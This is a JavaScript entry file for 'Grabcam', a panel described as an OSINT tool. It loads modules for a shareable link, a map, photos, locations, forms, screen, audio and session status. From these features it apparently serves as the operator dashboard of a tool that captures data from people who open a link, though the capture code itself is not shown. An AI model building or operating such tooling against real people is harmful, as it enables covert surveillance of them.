/**
 * Grabcam — панель OSINT. Точка входа: сборка из модулей (config, utils, layout, state, features).
 * Features подгружаются динамически, чтобы панель отображалась даже при ошибке в одном из них.
 * Автор инструмента: ERRORoX
 */
import { buildPanelHTML } from "./modules/layout.js";
import { clearAllPolls } from "./modules/utils.js";
import { API, POLL_IDS, POLL_INTERVALS } from "./modules/config.js";
import { state } from "./modules/state.js";

export function initPanel(container) {
  if (container.dataset.inited) return;
  container.dataset.inited = "1";
  clearAllPolls();
  container.innerHTML = buildPanelHTML();

  (async function runFeatures() {
    try {
      const features = await import("./modules/features/index.js");
      const { showLink, pollStatus, showCopyFeedback } = features.initControl(container);
      features.initSession(container);
      features.initLink(container, showCopyFeedback);
      features.initMap(container);
      features.initPhotos(container);
      features.initLocations(container);
      features.initForms(container);
      features.initScreen(container);
      features.initAudio(container);
      features.initSummary(container);

      try {
        const res = await fetch(API.runStatus);
        const st = await res.json();
        if (st.started_at != null && typeof st.started_at === "number") {
          state.sessionStartTime = st.started_at * 1000;
        }
        await features.loadSessionStats(container);
        features.updateSessionMetrics(container);
        const resultEl = container.querySelector("#gc-result");
        const submitBtn = container.querySelector("#gc-btn-start");
        const stopBtn = container.querySelector("#gc-btn-stop");
        const statusEl = container.querySelector("#gc-status");
        if (st.running || st.link || st.local_url) {
          if (st.link || st.local_url) showLink(st.link || null, st.local_url || null);
          if (st.running && submitBtn && stopBtn && statusEl) {
            submitBtn.disabled = true;
            submitBtn.style.display = "none";
            stopBtn.style.display = "inline-block";
            statusEl.textContent = "Сервер запущен. Ожидание ссылки…";
            POLL_IDS.status = setInterval(pollStatus, POLL_INTERVALS.status);
          }
          if (resultEl) {
            resultEl.classList.remove("gc-link-placeholder");
            if (st.link || st.local_url) resultEl.className = "gc-link-box gc-link-success";
          }
        }
      } catch (_) {}
    } catch (e) {
      console.error("Grabcam: ошибка загрузки модулей", e);
    }
  })();
}
